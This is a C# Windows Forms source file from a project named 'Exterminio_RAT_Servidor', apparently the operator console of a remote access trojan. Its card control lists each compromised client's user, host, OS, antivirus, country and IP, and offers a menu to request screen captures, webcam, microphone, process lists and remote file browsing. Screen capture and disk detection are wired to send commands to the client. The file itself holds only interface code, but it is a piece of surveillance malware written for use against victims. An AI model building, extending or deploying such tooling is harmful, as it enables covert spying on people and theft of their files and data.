using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Exterminio_RAT_Servidor
{
    public partial class AnimatedCard : UserControl
    {
       

        public AnimatedCard()
        {
            InitializeComponent();
            
            // Configurar el tamaño mínimo y máximo
            this.MinimumSize = new Size(600, 103);
            this.MaximumSize = new Size(2000, 103);
            
            // Configurar el ancho por defecto
            this.Width = 600;
            this.Height = 103;
            
            // Configurar cursor para indicar que es clickeable
            this.Cursor = Cursors.Hand;
            
            // Configurar tooltip
            ToolTip tooltip = new ToolTip();
            tooltip.SetToolTip(this, "Clic izquierdo para mostrar menú de acciones");
            
            // Configurar eventos de mouse para el control principal
            this.MouseClick += AnimatedCard_MouseClick;
            this.MouseEnter += AnimatedCard_MouseEnter;
            this.MouseLeave += AnimatedCard_MouseLeave;
            
            // Configurar eventos de mouse para todos los controles hijos
            SetupChildControlsEvents();
        }

        // Propiedad pública para obtener el ID del cliente
        public string ClientId
        {
            get { return labelInfo1.Text; }
        }

        private void SetupChildControlsEvents()
        {
            // Configurar eventos de mouse para todos los controles hijos
            foreach (Control control in this.Controls)
            {
                control.MouseClick += AnimatedCard_MouseClick;
                control.MouseEnter += AnimatedCard_MouseEnter;
                control.MouseLeave += AnimatedCard_MouseLeave;
                
                // Configurar cursor para controles hijos
                control.Cursor = Cursors.Hand;
            }
        }

        // Método para configurar toda la información del cliente de una vez
        public void SetClientInfo(string id, string user, string hostname, string systemOS, string av, string pais, string ip, string arch)
        {
            // Los labels principales son headers/títulos, no los cambiamos
            // labelID.Text = "ID" (se mantiene como header)
            // labelUsuario.Text = "Usuario" (se mantiene como header)
            // labelHost.Text = "Host" (se mantiene como header)
            // labelSistema.Text = "Sistema OS" (se mantiene como header)
            // labelAV.Text = "AV" (se mantiene como header)
            // labelPais.Text = "Pais" (se mantiene como header)
            // labelIP.Text = "IP" (se mantiene como header)
            // labelArch.Text = "Arch" (se mantiene como header)

            // Solo configurar los labels de info con la información real del cliente
            labelInfo1.Text = id;
            labelInfo2.Text = user;
            labelInfo3.Text = hostname;
            labelInfo4.Text = systemOS;
            labelInfo5.Text = av;
            labelInfo6.Text = pais;
            labelInfo7.Text = ip;
            labelInfo8.Text = arch;
        }

        private void AnimatedCard_MouseClick(object sender, MouseEventArgs e)
        {
                                Console.WriteLine($"MouseClick detectado en AnimatedCard: {e.Button} en {e.Location}");
            
            if (e.Button == MouseButtons.Left)
            {
                                        Console.WriteLine("Clic izquierdo detectado, mostrando menú contextual...");
                
                // Reproducir sonido de clic
                ReproducirSonidoClic();
                
                // Obtener la posición de la pantalla donde se hizo clic
                Point screenPosition = this.PointToScreen(e.Location);
                                        Console.WriteLine($"Posición de pantalla: {screenPosition}");
                
                try
                {
                    // Mostrar el menú contextual
                    MultiLevelDropdownMenu.ShowContextMenu(screenPosition, OnMenuItemSelected);
                                                Console.WriteLine("Menú contextual mostrado exitosamente");
                }
                catch (Exception ex)
                {
                                            Console.WriteLine($"Error mostrando menú contextual: {ex.Message}");
                        Console.WriteLine($"StackTrace: {ex.StackTrace}");
                }
            }
        }

        private void ReproducirSonidoClic()
        {
            try
            {
                // Reproducir sonido de clic (usar el mismo sonido de conexión)
                string rutaSonido = System.IO.Path.Combine(Application.StartupPath, "Sonidos", "ConexionRecibida.wav");
                
                if (System.IO.File.Exists(rutaSonido))
                {
                    using (System.Media.SoundPlayer player = new System.Media.SoundPlayer(rutaSonido))
                    {
                        player.Play();
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error reproduciendo sonido de clic: {ex.Message}");
            }
        }

        private void AnimatedCard_MouseEnter(object sender, EventArgs e)
        {
            // Cambiar cursor a mano cuando el mouse entra en la tarjeta
            this.Cursor = Cursors.Hand;
                        
        }

        private void AnimatedCard_MouseLeave(object sender, EventArgs e)
        {
            // Restaurar cursor y color cuando el mouse sale de la tarjeta
            this.Cursor = Cursors.Default;
          
            
       
        }

        private void OnMenuItemSelected(object sender, MenuItemSelectedEventArgs e)
        {
            string clientId = this.ClientId; // ID del cliente específico
            string action = e.MenuItem.Action;
            string text = e.MenuItem.Text;
            
            Console.WriteLine($"Cliente {clientId}: {text} - {action}");

            // Aquí puedes manejar las acciones específicas para este cliente
            switch (action)
            {
                case "screen_capture":
                    // Enviar comando de captura al cliente específico
                    Console.WriteLine($"Enviando comando de captura de pantalla al cliente {clientId}");
                    ShowNotification("Comando Enviado", $"Captura de pantalla solicitada al cliente {clientId}", ToolTipIcon.Info);

                    // Buscar el formulario principal y enviar comando de captura
                    Form mainFormCapture = Application.OpenForms.OfType<Form>().FirstOrDefault(f => f is Form1);
                    if (mainFormCapture != null && mainFormCapture is Form1 form1Capture)
                    {
                        _ = Task.Run(async () =>
                        {
                            await form1Capture.SendCaptureCommand(clientId);
                        });
                    }
                    break;
                case "webcam":
                    // Enviar comando al cliente específico
                    Console.WriteLine($"Enviando comando de webcam al cliente {clientId}");
                    ShowNotification("Comando Enviado", $"Webcam solicitada al cliente {clientId}", ToolTipIcon.Info);
                    break;
                case "microphone":
                    // Enviar comando al cliente específico
                    Console.WriteLine($"Enviando comando de micrófono al cliente {clientId}");
                    ShowNotification("Comando Enviado", $"Micrófono solicitado al cliente {clientId}", ToolTipIcon.Info);
                    break;
                case "system_info":
                    // Enviar comando al cliente específico
                    Console.WriteLine($"Solicitando información del sistema al cliente {clientId}");
                    ShowNotification("Comando Enviado", $"Información del sistema solicitada al cliente {clientId}", ToolTipIcon.Info);
                    break;
                case "processes":
                    // Enviar comando al cliente específico
                    Console.WriteLine($"Solicitando procesos al cliente {clientId}");
                    ShowNotification("Comando Enviado", $"Procesos solicitados al cliente {clientId}", ToolTipIcon.Info);
                    break;
                case "file_explorer":
                    // Enviar comando al cliente específico
                    Console.WriteLine($"Abriendo explorador de archivos del cliente {clientId}");
                    ShowNotification("Comando Enviado", $"Explorador de archivos abierto para cliente {clientId}", ToolTipIcon.Info);

                    // Abrir el formulario de gestor de archivos
                    Form exploradorArchivosForm = new GestorArchivosClientesFT(clientId);
                    exploradorArchivosForm.Show();
                    
                    // Enviar comando de detección de discos al cliente
                    _ = Task.Run(async () =>
                    {
                        try
                        {
                            // Buscar el formulario principal y enviar comando de detección de discos
                            Form mainFormDisk = Application.OpenForms.OfType<Form>().FirstOrDefault(f => f is Form1);
                            if (mainFormDisk != null && mainFormDisk is Form1 form1Disk)
                            {
                                await form1Disk.SendDiskDetectionCommand(clientId);
                                Console.WriteLine($"Comando de detección de discos enviado al cliente {clientId}");
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Error enviando comando de detección de discos: {ex.Message}");
                        }
                    });
                    break;
                case "gallery_clients":
                    // Abrir galería de clientes
                    Console.WriteLine($"Abriendo galería de clientes desde cliente {clientId}");
                    ShowNotification("Galería", "Abriendo galería de clientes", ToolTipIcon.Info);

                    Form galeriaClientesForm = new GaleriaClientesFT();
                    galeriaClientesForm.Show(); // Ventana independiente, no modal
                    break;
                default:
                    Console.WriteLine($"Acción no implementada: {action} para cliente {clientId}");
                    ShowNotification("Acción No Implementada", $"La acción '{action}' no está implementada", ToolTipIcon.Warning);
                    break;
            }
        }

        private void ShowNotification(string title, string message, ToolTipIcon icon = ToolTipIcon.Info)
        {
            try
            {
                // Buscar el formulario principal para acceder al NotifyIcon
                Form mainFormNotification = Application.OpenForms.OfType<Form>().FirstOrDefault(f => f is Form1);
                if (mainFormNotification != null && mainFormNotification is Form1 form1Notification)
                {
                    form1Notification.ShowNotification(title, message, icon);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error mostrando notificación: {ex.Message}");
            }
        }
    }
}

